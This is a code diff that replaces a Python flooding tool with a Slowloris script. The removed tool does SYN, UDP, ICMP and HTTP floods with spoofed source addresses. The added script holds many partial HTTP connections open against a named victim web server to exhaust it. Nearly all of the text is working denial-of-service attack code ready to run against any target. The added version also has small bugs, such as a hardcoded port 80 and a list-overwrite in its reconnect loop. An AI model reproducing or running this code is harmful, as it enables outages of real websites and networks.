@@ -1,126 +1,121 @@
-from sys import stdout
-from scapy.all import *
-from random import randint
-from argparse import ArgumentParser
-import threading
+#!/usr/bin/env python
+import sys
+import socket
 import time
+import logging
+import string
+import argparse
+import ssl
+from random import choice, randint
+
+parser = argparse.ArgumentParser(description="Slowloris PoC demonstration in python3")
+parser.add_argument('RHOST', nargs="?", help="Remote host, the victim webserver in either domain or IP format")
+parser.add_argument('-p', '--port', default=80, help="Port of the remote webserver", type=int)
+parser.add_argument('-c', '--count', default=200, help="Number of connections to fire up", type=int)
+parser.add_argument('-f', '--freq', default=15, help="Frequency to message the web server", type=int)
+parser.add_argument('-v', '--verbose', dest="verbose", action="store_true", help="Enables verbosity")
+parser.add_argument('-s', '--https', dest="https", action="store_true", help="Secure the attacker connections with HTTPS")
+parser.set_defaults(verbose=False)
+parser.set_defaults(https=False)
+args = parser.parse_args()
+
+if not args.RHOST:
+    print("You must specify a remote server")
+    parser.print_help()
+    sys.exit(1)
 
 
-# Flooding
+logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%H:%M:%S", level=(logging.DEBUG if args.verbose else logging.INFO))
+
+user_agents = [
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
+]
+
+host = args.RHOST
+port = args.port
+keep_alive_freq = args.freq
+connections = args.count
+
+class attacker(object):
+    def __init__(self, id, agent, socket):
+        self.id = id
+        self.agent = agent
+        self.socket = socket
+
+def init_attack(nAttackers):
+    identifier = 'id{}'.format(nAttackers)
+    agent = choice(user_agents).encode()
+    ip = socket.gethostbyname(host)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    if args.https:
+        ssl.wrap_socket(s)
+
+    s.settimeout(5)
+    s.connect((ip, 80))
+    s.send("GET /?{} HTTP/1.1\r\n".format(randint(0, 50000)).encode())
+    s.send("User-Agent: {}\r\n".format(agent).encode())
+    s.send("Cache-Control: no-cache\r\n".encode())
+    s.send("Accept-Encoding: {}\r\n".format("gizp, deflate").encode())
+    s.send("Accept-Language: {}\r\n".format("en-US,en;q=0.9").encode())
+    s.send("Connection: keep-alive\r\n".encode())
+    logging.debug("Creating attacker | ID: {}".format(identifier))
+    return attacker(identifier, agent, s)
+
 def main():
-    print("""
+    logging.info("Attacking {} with {} attackers".format(host, connections))  
+    logging.info("Establishing connections..")
+    attackers = []
 
-
-
-""")
-    time.sleep(1)
-    parser = ArgumentParser()
-    parser.add_argument("--SynFlood", "-s", action='store_true', help="Syn Flood Attack")
-    parser.add_argument("--UDPFlood", "-u", action='store_true', help="UDP Flood Attack")
-    parser.add_argument("--ICMPFlood", "-i", action='store_true', help="ICMP Flood Attack")
-    parser.add_argument("--HTTPFlood", "-H", action='store_true', help="HTTP Flood Attack")
-    parser.add_argument("--target", "-t", required=True, help="target IP address")
-    parser.add_argument("--port", "-p", default=80, help="target port number")
-    parser.add_argument("--thread", "-T", default=10, help="target port number")
-    parser.add_argument(
-        "--repeat", "-r", default=100, help="attack number of repetition"
-    )
-
-    args = parser.parse_args()
-    
-    dstIP = args.target
-    dstPort = args.port
-    repeat = args.repeat
-
-    if args.SynFlood:
-        target = SynFlood
-    elif args.UDPFlood:
-        target = UDPFlood
-    elif args.ICMPFlood:
-        target = ICMPFlood
-    elif args.HTTPFlood:
-        target = HTTPFlood
-    else:
-        print("-"*35 + "Attack Type is Missing"+35*"-"+"\n")
-        return
-    
-    threads =[]
-    for _ in range(int(args.thread)):
-        t = threading.Thread(target=target,args=(dstIP,dstPort,int(repeat)))
-        t.start()
-        threads.append(t)
-    for thread in threads:
-        thread.join()
-
-def randomSrcIP():
-    ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
-    return ip 
-
-def randomPort():
-    port = randint(0, 65535)
-    return port
-
-def SynFlood(dstIP,dstPort,repeat):
-    for x in range(int(repeat)):
-        IP_Packet = IP()
-        IP_Packet.src = randomSrcIP()
-        IP_Packet.dst = dstIP
-
-        TCP_Packet = TCP()
-        TCP_Packet.sport = randomPort() 
-        TCP_Packet.dport = dstPort
-        TCP_Packet.flags = "S"
-        send(IP_Packet/TCP_Packet,verbose=False)
-        print("-"*35 + "SYN Packet is Successfuly sended"+35*"-"+"\n")
-
-def HTTPFlood(dstIP,dstPort,repeat):
-    for x in range(repeat):
+    for x in range((connections)):
         try:
-            IP_Packet = IP()
-            IP_Packet.dst = dstIP
-            IP_Packet.src = randomSrcIP()
+            attackers.append(init_attack(len(attackers) + 1))
+        except socket.error:
+            break
 
-            TCP_Packet = TCP()
-            TCP_Packet.sport = randomPort()
-            TCP_Packet.dport = dstPort
-            TCP_Packet.flags="S"
-            
-            syn = IP_Packet/TCP_Packet
-            packet_SynAck = sr1(syn,timeout=1,verbose=False)
-            
-            if(packet_SynAck is None):
-                print("-"*35 + "ACK+SYN Packet is Filtered"+35*"-"+"\n")
-                continue
-            TCP_Packet.flags="A"
-            TCP_Packet.seq = packet_SynAck[TCP].ack
-            TCP_Packet.ack= packet_SynAck[TCP].seq+1
-            getStr='GET / HTTP/1.0\n\n'
+    while True:
+        try:
+            logging.info("Keeping {} attacker connections alive.. ".format(len(attackers)))
+            for s in list(attackers):
+                try:
+                    s.socket.send("X-{}: {}\r\n".format(randint(0, 50000), randint(0, 50000)).encode())
+                except socket.error as error:
+                    logging.debug("Dead attacker: {} | Exception: {}".format(s.id, error))
+                    attackers.remove(s)
 
-            send(IP_Packet/TCP_Packet/getStr,verbose=False)
-            print("-"*35 + "HTTP Packet is Successfuly sended"+35*"-"+"\n")
-        except:
-            print("-"*35 + "Error Occured during Sending packets"+35*"-"+"\n")
+            for x in range(connections - len(attackers)):
+                logging.debug("Reviving dead attacker connections..")
+                try:
+                    attackers = [(init_attack(len(attackers) + 1))]
+                except socket.error:
+                    break
+            time.sleep(keep_alive_freq)
 
-def UDPFlood(dstIP,dstPort,repeat):
-    data = "A"*1250
-    for x in range(repeat):
-        IP_Packet = IP()
-        IP_Packet.src = randomSrcIP()
-        IP_Packet.dst = dstIP
-
-        UDP_Packet = UDP()
-        UDP_Packet.dport = randomPort()
-        send(IP_Packet/UDP_Packet/Raw(load=data),verbose=False)
-        print("-"*35 + "UDP Packet is Successfuly sended"+35*"-"+"\n")
-
-def ICMPFlood(dstIP,dstPort,repeat):
-    for x in range(repeat):
-        IP_Packet = IP()
-        IP_Packet.src = dstIP
-        IP_Packet.dst = randomSrcIP()
-        ICMP_Packet = ICMP()
-        send(IP_Packet/ICMP(),verbose=False)
-    print("-"*35 + "ICMP Packet is Successfuly sended"+35*"-"+"\n")
-
-
-main()
+        except (KeyboardInterrupt, SystemExit):
+            print("\nStopping the attack..")
+            break
+                  
+if __name__ == "__main__":
+    main()
